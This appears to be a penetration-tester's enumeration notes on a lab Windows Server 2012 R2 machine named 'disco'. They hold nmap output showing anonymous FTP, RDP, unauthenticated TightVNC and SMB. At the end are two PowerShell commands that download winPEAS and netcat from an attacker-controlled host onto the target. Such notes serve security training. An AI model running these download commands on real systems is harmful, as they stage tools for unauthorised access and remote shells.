* Server: Microsoft Server 2012 R2
* Build #: 9600
* VNC Users: (check observations.md)
* Hostname: DISCO
* Domain: DISCO
* Netbios: 6.3.9600
* Arch: amd64

```info
    Hostname: disco
    ProductName: Windows Server 2012 R2 Standard
    EditionID: ServerStandard
    ReleaseId: 
    BuildBranch: 
    CurrentMajorVersionNumber: 
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 1
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC) Coordinated Universal Time
    IsVirtualMachine: True
    Current Time: 1/31/2023 2:08:13 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: 
```

**FTP (21)**
```shell
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-07-19  10:25PM       <DIR>          aspnet_client
| 04-07-19  07:14PM                99710 iis-85.png
|_04-07-19  07:14PM                  701 iisstart.htm
| ftp-syst: 
|_  SYST: Windows_NT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


**RDP (3389)**
```shell
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=disco
| Not valid before: 2023-01-27T09:22:17
|_Not valid after:  2023-07-29T09:22:17
| rdp-ntlm-info: 
|   Target_Name: DISCO
|   NetBIOS_Domain_Name: DISCO
|   NetBIOS_Computer_Name: DISCO
|   DNS_Domain_Name: disco
|   DNS_Computer_Name: disco
|   Product_Version: 6.3.9600
|_  System_Time: 2023-01-30T13:52:33+00:00
|_ssl-date: 2023-01-30T13:52:46+00:00; -2s from scanner time.
```

**VNC (5800, 5900)**
```shell
5800/tcp  open  vnc-http           TightVNC (user: disco; VNC TCP port: 5900)
|_http-title: TightVNC desktop [disco]
5900/tcp  open  vnc                VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     None (1)
|     Tight (16)
|   Tight auth subtypes: 
|     None
|_  WARNING: Server does not require authentication
```

SMB (135, 139, 445)
```shell
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
```


```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.144/winPEASx64.exe', 'w.exe')
```

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.144/nc64.exe', 'nc.exe')
```